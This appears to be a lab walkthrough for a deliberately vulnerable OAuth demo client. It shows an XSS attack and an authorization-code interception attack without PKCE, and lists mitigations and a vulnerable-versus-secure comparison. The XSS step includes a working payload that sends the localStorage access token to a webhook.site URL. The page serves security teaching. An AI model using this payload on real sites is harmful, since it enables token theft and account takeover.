🔴 Attack 1: XSS Attack - Steal Access Token via Unsanitized Input

The vulnerable client has a message board that doesn't sanitize user input, allowing XSS attacks to steal access tokens from localStorage.

Step 1: Login to the vulnerable client

Login with: demo / password123

Step 2: Set up webhook to capture stolen token

1. Go to https://webhook.site and copy your unique URL

2. Replace YOUR_WEBHOOK_URL in the payload below with your webhook URL

Step 3: Inject XSS payload into the message board

Copy this XSS payload (update webhook URL first):

<img src=x onerror="fetch('https://webhook.site/YOUR_WEBHOOK_URL?token='+localStorage.getItem('access_token'))">


For testing without webhook (shows alert):

<img src=x onerror="alert(localStorage.getItem('access_token'))">


✓ Paste the payload into the message board on the vulnerable client

✓ Click "Post Message" and check your webhook.site for the stolen token!

Why this works:
  • No Input Sanitization: User input directly inserted into DOM using innerHTML
  • localStorage Exposed: Access tokens stored in localStorage (accessible to any JavaScript)
  • No CSP: No Content Security Policy to block inline scripts
  • XSS Execution: Malicious JavaScript runs with full page privileges
  • Token Theft: Attacker can read localStorage and exfiltrate tokens
Mitigation:
  • Sanitize all user input (use textContent instead of innerHTML)
  • Store tokens in HttpOnly cookies (not accessible to JavaScript)
  • Implement Content Security Policy (CSP)
  • Use DOMPurify or similar libraries for HTML sanitization

🔴 Attack 2: Authorization Code Interception & Exploitation (No PKCE)

This demonstrates the complete attack chain: intercepting the authorization code from the URL, then exchanging it for an access token without PKCE protection.

Step 1: Intercept Authorization Code
1. Click button to login at vulnerable client
2. After OAuth login, authorization code appears in URL
3. Copy the code from: http://localhost:3000/callback?code=XXXXX

Step 2: Exchange Intercepted Code for Access Token (Attacker)

Why this attack works:
  • Code Exposure: Authorization code visible in browser URL, history, logs
  • No PKCE: Server doesn't require code_verifier for token exchange
  • No Binding: Anyone with the code can exchange it
  • Attack Vectors: Network sniffing, malware, browser history, shoulder surfing
  • Result: Attacker gets full access token and compromises user account

📊 Vulnerability vs Secure Comparison

❌ Vulnerable (Port 3000)

  • No PKCE validation
  • No state parameter
  • localStorage token storage
  • Client-side token exchange
  • Tokens in console logs
  • Weak redirect URI validation
  • Code visible in URL
  • No token expiration

✅ Secure (Port 3001)

  • PKCE with S256 enforced
  • State parameter required
  • Server-side session storage
  • Server-side token exchange
  • Safe logging (redacted)
  • Strict whitelist validation
  • Codes never exposed to browser
  • Token expiration enforced
